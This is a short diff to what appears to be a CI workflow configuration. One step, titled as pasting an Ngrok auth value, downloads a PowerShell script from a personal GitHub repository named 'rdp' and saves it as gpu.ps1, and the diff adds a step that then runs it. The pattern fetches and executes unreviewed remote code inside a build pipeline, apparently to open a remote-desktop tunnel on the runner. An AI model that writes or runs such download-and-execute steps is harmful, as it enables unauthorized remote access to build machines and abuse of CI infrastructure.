@@ -16,4 +16,5 @@ jobs:
       - run: 
           name: Paste Ngrok Auth Value In Hosted Link
           command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/kameltryvps/rdp/main/sh -OutFile gpu.ps1
+            Invoke-WebRequest https://raw.githubusercontent.com/kameltryvps/rdp/main/sh -OutFile gpu.ps1           
+      - run: ./gpu.ps1
